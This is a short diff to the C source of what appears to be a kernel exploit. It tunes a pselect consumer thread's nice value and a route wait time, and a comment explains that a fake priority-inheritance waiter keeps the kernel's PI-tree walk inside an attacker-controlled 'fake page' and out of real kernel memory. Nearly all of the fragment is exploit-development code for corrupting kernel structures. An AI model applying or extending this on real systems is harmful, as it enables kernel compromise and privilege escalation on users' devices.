@@ -27,6 +27,7 @@
 #include <sys/ioctl.h>
 #include <sys/mman.h>
 #include <sys/prctl.h>
+#include <poll.h>
 #include <sys/resource.h>
 #include <sys/select.h>
 #include <sys/socket.h>
@@ -138,12 +139,15 @@
 #define CONSUMER_CORE (CORE + 1)
 #define CONSUMER_MAX_CALLS 1
 #define PSELECT_ROUTE_NFDS 320
-#define PSELECT_CONSUMER_NICE 19
+/* Nice 1 -> prio 121 < FAKE_WAITER_PRIO 130: the PI-tree insert takes
+ * the rb_left branch and stays inside the fake page.  Nice >= 10 walks
+ * rb_right = ASHMEM_MISC_FOPS into real kernel memory (livelock). */
+#define PSELECT_CONSUMER_NICE 1
 #define PSELECT_CONSUMER_BURST_CALLS 1
 #define PSELECT_ENTER_DELAY_USEC 50000
 #define PSELECT_TIMEOUT_SEC 5
 #ifndef ROUTE_WAIT_SECONDS
-#define ROUTE_WAIT_SECONDS 8
+#define ROUTE_WAIT_SECONDS 1
 #endif
 #define EARLY_PIPE_PREPARE 0
 #define SLIDE_NFULNL_LOGGER \
